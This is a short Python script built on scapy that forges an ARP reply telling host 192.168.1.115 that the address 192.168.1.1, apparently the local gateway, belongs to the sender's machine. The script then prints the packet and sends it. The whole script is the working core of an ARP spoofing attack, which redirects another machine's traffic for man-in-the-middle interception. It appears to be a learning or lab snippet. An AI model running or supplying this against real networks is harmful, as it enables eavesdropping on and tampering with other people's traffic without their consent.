
import scapy.all as scapy

# packet ready to send it.
packet = scapy.ARP(op=2, pdst="192.168.1.115", hwdst="00:0c:29:48:51:8c", psrc="192.168.1.1")
print(packet.summary())
print(packet.show())

scapy.send(packet)
